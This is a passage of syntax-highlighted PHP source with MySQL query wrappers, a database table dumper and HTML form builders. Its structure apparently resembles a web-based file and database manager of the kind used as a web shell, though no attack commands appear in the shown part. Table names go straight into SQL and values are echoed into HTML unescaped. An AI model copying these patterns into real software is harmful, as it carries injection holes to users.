<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">filedata</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">qy</span>($<span style="color: #eeeeec;">sql</span>) { 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">mysqllink</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">echo $sql.'&lt;br&gt;';</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = $<span style="color: #eeeeec;">error</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!$<span style="color: #eeeeec;">res</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_query(</span>$<span style="color: #eeeeec;">sql</span>,$<span style="color: #eeeeec;">mysqllink</span>)) { 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">is_resource(</span>$<span style="color: #eeeeec;">res</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">1</span>; 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">2</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }<span style="background-color: #404040;"> </span>  
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">q</span>($<span style="color: #eeeeec;">sql</span>) { 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">mysqllink</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> @<span style="color: #eeeeec; background-color: #2e3436;">mysql_query(</span>$<span style="color: #eeeeec;">sql</span>,$<span style="color: #eeeeec;">mysqllink</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">fr</span>($<span style="color: #eeeeec;">qy</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">mysql_free_result(</span>$<span style="color: #eeeeec;">qy</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">sizecount</span>($<span style="color: #eeeeec;">fileSize</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">size</span> = <span style="color: #eeeeec; background-color: #2e3436;">sprintf(</span><span style="color: #ad7fa8; font-style: italic;">"%u"</span>, $<span style="color: #eeeeec;">fileSize</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">size</span> == <span style="color: #eeeeec; background-color: #2e3436;">0</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #ad7fa8; font-style: italic;">'0 Bytes'</span> ;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">sizename</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">' Bytes'</span>, <span style="color: #ad7fa8; font-style: italic;">' KB'</span>, <span style="color: #ad7fa8; font-style: italic;">' MB'</span>, <span style="color: #ad7fa8; font-style: italic;">' GB'</span>, <span style="color: #ad7fa8; font-style: italic;">' TB'</span>, <span style="color: #ad7fa8; font-style: italic;">' PB'</span>, <span style="color: #ad7fa8; font-style: italic;">' EB'</span>, <span style="color: #ad7fa8; font-style: italic;">' ZB'</span>, <span style="color: #ad7fa8; font-style: italic;">' YB'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">round(</span> $<span style="color: #eeeeec;">size</span> / <span style="color: #eeeeec; background-color: #2e3436;">pow(1024</span>, ($<span style="color: #eeeeec;">i</span> = <span style="color: #eeeeec; background-color: #2e3436;">floor(log(</span>$<span style="color: #eeeeec;">size</span>, <span style="color: #eeeeec; background-color: #2e3436;">1024</span>)))), <span style="color: #eeeeec; background-color: #2e3436;">2</span>) . $<span style="color: #eeeeec;">sizename</span>[$<span style="color: #eeeeec;">i</span>];
}
<span style="color: #888a85;">// </span><span style="color: #888a85;">&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">sqldumptable</span>($<span style="color: #eeeeec;">table</span>, $<span style="color: #eeeeec;">fp</span>=<span style="color: #eeeeec; background-color: #2e3436;">0</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">mysqllink</span>;

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tabledump</span> = <span style="color: #ad7fa8; font-style: italic;">"DROP TABLE IF EXISTS `$table`;\n"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SHOW CREATE TABLE $table"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">create</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_row(</span>$<span style="color: #eeeeec;">res</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tabledump</span> .= $<span style="color: #eeeeec;">create</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>].<span style="color: #ad7fa8; font-style: italic;">";\n\n"</span>;

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">fp</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fwrite(</span>$<span style="color: #eeeeec;">fp</span>,$<span style="color: #eeeeec;">tabledump</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">tabledump</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tabledump</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rows</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SELECT * FROM $table"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span> ($<span style="color: #eeeeec;">row</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_assoc(</span>$<span style="color: #eeeeec;">rows</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">row</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">k</span>=&gt;$<span style="color: #eeeeec;">v</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">row</span>[$<span style="color: #eeeeec;">k</span>] = <span style="color: #ad7fa8; font-style: italic;">"'"</span>.@<span style="color: #eeeeec; background-color: #2e3436;">mysql_real_escape_string(</span>$<span style="color: #eeeeec;">v</span>).<span style="color: #ad7fa8; font-style: italic;">"'"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tabledump</span> = <span style="color: #ad7fa8; font-style: italic;">'INSERT INTO `'</span>.$<span style="color: #eeeeec;">table</span>.<span style="color: #ad7fa8; font-style: italic;">'` VALUES ('</span>.<span style="color: #eeeeec; background-color: #2e3436;">implode(</span><span style="color: #ad7fa8; font-style: italic;">", "</span>, $<span style="color: #eeeeec;">row</span>).<span style="color: #ad7fa8; font-style: italic;">');'</span>.<span style="color: #ad7fa8; font-style: italic;">"\n"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">fp</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fwrite(</span>$<span style="color: #eeeeec;">fp</span>,$<span style="color: #eeeeec;">tabledump</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">tabledump</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fwrite(</span>$<span style="color: #eeeeec;">fp</span>,<span style="color: #ad7fa8; font-style: italic;">"\n\n"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fr(</span>$<span style="color: #eeeeec;">rows</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">p</span>($<span style="color: #eeeeec;">str</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">str</span>.<span style="color: #ad7fa8; font-style: italic;">"\n"</span>;
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">tbhead</span>() {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;'</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">tbfoot</span>(){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/table&gt;'</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">makehide</span>($<span style="color: #eeeeec;">name</span>,$<span style="color: #eeeeec;">value</span>=<span style="color: #ad7fa8; font-style: italic;">''</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;"</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">makeinput</span>($<span style="color: #eeeeec;">arg</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'size'</span>] = $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'size'</span>] &gt; <span style="color: #eeeeec; background-color: #2e3436;">0</span> ? <span style="color: #ad7fa8; font-style: italic;">"size=\"$arg[size]\""</span> : <span style="color: #ad7fa8; font-style: italic;">"size=\"100\""</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'extra'</span>] = $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'extra'</span>] ? $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'extra'</span>] : <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'type'</span>] &amp;&amp; $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'type'</span>] = <span style="color: #ad7fa8; font-style: italic;">'text'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>] = $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>] ? $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;br /&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'class'</span>] = $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'class'</span>] ? $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'class'</span>] : <span style="color: #ad7fa8; font-style: italic;">'input'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'newline'</span>]) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">makeselect</span>($<span style="color: #eeeeec;">arg</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'onchange'</span>]) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">onchange</span> = <span style="color: #ad7fa8; font-style: italic;">'onchange="'</span>.$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'onchange'</span>].<span style="color: #ad7fa8; font-style: italic;">'"'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>] = $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>] ? $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>] : <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'newline'</span>]) <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">is_array(</span>$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'option'</span>])) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'nokey'</span>]) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'option'</span>] <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">value</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'selected'</span>]==$<span style="color: #eeeeec;">value</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;option value=\"$value\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'option'</span>] <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span>=&gt;$<span style="color: #eeeeec;">value</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'selected'</span>]==$<span style="color: #eeeeec;">key</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;option value=\"$key\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;/select&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'newline'</span>]) <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">formhead</span>($<span style="color: #eeeeec;">arg</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">self</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'method'</span>] &amp;&amp; $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'method'</span>] = <span style="color: #ad7fa8; font-style: italic;">'post'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'action'</span>] &amp;&amp; $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'action'</span>] = $<span style="color: #eeeeec;">self</span>;
